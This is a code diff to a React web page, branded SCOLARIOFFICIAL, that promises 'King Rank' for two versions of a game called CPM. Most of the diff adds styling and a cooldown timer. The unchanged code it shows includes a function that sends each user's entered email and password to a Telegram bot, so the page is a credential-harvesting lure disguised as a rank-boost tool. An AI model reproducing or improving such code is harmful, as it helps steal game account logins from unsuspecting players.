@@ -55,9 +55,14 @@
             transition: all 0.3s ease;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
         }
-        button:hover {
+        button:hover:not(:disabled) {
             background-color: rgba(255, 255, 255, 0.4);
             transform: translateY(-2px); /* Subtle lift effect */
+        }
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
         }
         .bg-controls {
             position: absolute;
@@ -107,6 +112,11 @@
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .loading-spinner {
             width: 20px;
@@ -119,6 +129,11 @@
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+        .cooldown-timer {
+            font-size: 0.9em;
+            color: #ffcc00;
+            margin-top: 10px;
         }
         /* Responsive adjustments */
         @media (max-width: 768px) {
@@ -215,6 +230,8 @@
             const [password, setPassword] = React.useState('');
             const [status, setStatus] = React.useState('');
             const [isLoading, setIsLoading] = React.useState(false);
+            const [isCooldown, setIsCooldown] = React.useState(false);
+            const [cooldownTime, setCooldownTime] = React.useState(0);
 
             const handleCPM1Click = () => {
                 setCurrentConfig(CPM1_CONFIG);
@@ -231,7 +248,25 @@
                 setEmail('');
                 setPassword('');
                 setStatus('');
+                setIsCooldown(false);
+                setCooldownTime(0);
             };
+
+            const startCooldown = () => {
+                setIsCooldown(true);
+                setCooldownTime(20000); // 20000 seconds cooldown
+                const interval = setInterval(() => {
+                    setCooldownTime(prev => {
+                        if (prev <= 1) {
+                            clearInterval(interval);
+                            setIsCooldown(false);
+                            return 0;
+                        }
+                        return prev - 1;
+                    });
+                }, 1000);
+            };
+
             const sendCPM1Notification = async (email, password) => {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 const message = `🔐 Login Cpm1:\n📧 Email: ${email}\n🔒 Password: ${password}`;
@@ -367,39 +402,40 @@
 
             const handleSubmit = async (e) => {
                 e.preventDefault();
+                if (isCooldown) return;
+                
+                setIsLoading(true);
+                setStatus('');
+                
                 const token = await login(email, password);
                 
                 if (token) {
                     await setRank(token);
                 }
+                
+                setIsLoading(false);
+                startCooldown();
             };
-        /*    const handleSubmit = async (e) => {
-                e.preventDefault();
-                setIsLoading(true);
-                setStatus('');
-                // Simulate API call (replace with actual logic)
-                setTimeout(() => {
-                    setStatus('Login successful!'); // Or error message
-                    setIsLoading(false);
-                }, 2000);
-            };
-*/
+
             const renderHomePage = () => (
                 <div className="min-h-screen flex items-center justify-center p-4 relative z-10">
                     <div className="gaming-card w-full max-w-lg p-8">
                         <h1 className="text-4xl md:text-5xl font-bold text-center mb-8 text-blue-400 glow-text game-font">
                             SCOLARIOFFICIAL
                         </h1>
+                        <p className="text-center text-gray-300 mb-8">
+                        Choose the Cpm version to easily get King Rank!
+                        </p>
                         <div className="flex flex-col space-y-4">
                             <button 
                                 onClick={handleCPM1Click}
-                                className="neon-button btn-primary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg md:text-xl"
+                                className="neon-button btn-primary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg md:text-xl hover:scale-105 transition-transform"
                             >
                                 <i className="fas fa-gamepad mr-3"></i> KING CPM 1
                             </button>
                             <button 
                                 onClick={handleCPM2Click}
-                                className="neon-button btn-secondary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg md:text-xl"
+                                className="neon-button btn-secondary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg md:text-xl hover:scale-105 transition-transform"
                             >
                                 <i className="fas fa-gamepad mr-3"></i> KING CPM 2
                             </button>
@@ -433,7 +469,7 @@
                                     id="email"
                                     value={email}
                                     onChange={(e) => setEmail(e.target.value)}
-                                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-gray-400"
+                                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-gray-400 transition-all"
                                     placeholder="Enter your email"
                                     required
                                     aria-describedby="email-error"
@@ -449,7 +485,7 @@
                                     id="password"
                                     value={password}
                                     onChange={(e) => setPassword(e.target.value)}
-                                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-gray-400"
+                                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-gray-400 transition-all"
                                     placeholder="Enter your password"
                                     required
                                     aria-describedby="password-error"
@@ -458,16 +494,28 @@
                             
                             <button
                                 type="submit"
-                                disabled={isLoading}
-                                className="w-full neon-button btn-primary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg"
+                                disabled={isLoading || isCooldown}
+                                className="w-full neon-button btn-primary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg transition-all"
                             >
                                 {isLoading ? (
                                     <div className="flex items-center justify-center">
                                         <div className="loading-spinner mr-3"></div>
                                         Processing...
                                     </div>
+                                ) : isCooldown ? (
+                                    <div className="flex items-center justify-center">
+                                        <i className="fas fa-clock mr-3"></i>
+                                        Cooldown: {cooldownTime}s
+                                    </div>
                                 ) : 'Get King Rank'}
                             </button>
+                            
+                            {isCooldown && (
+                                <div className="cooldown-timer text-center">
+                                    <i className="fas fa-info-circle mr-2"></i>
+                                    Wait {cooldownTime} seconds before trying again.
+                                </div>
+                            )}
                         </form>
                         
                         {status && (
